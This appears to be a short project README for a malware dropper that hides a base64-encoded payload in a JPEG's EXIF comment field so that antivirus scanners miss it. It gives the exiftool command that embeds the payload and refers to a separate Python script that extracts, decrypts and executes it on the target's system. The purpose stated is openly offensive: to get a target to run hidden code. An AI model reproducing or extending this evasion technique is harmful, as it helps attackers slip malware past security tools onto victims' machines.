# encoded_exif_dropper_malware

I took a payload which I wanted to have the target execute on their system. encoded it using base64 encoding and appended it to a image's exif data to bypass antivirus scanners scanning the exe. 

To embed the encrypted payload use:

exiftool "-comment<=/Users/yallah/Documents/encrypted_payload.py"  /Users/yallah/Desktop/image_of_choice.jpg

python script used to extract the payload from exif and decrypt before exec is in py file.
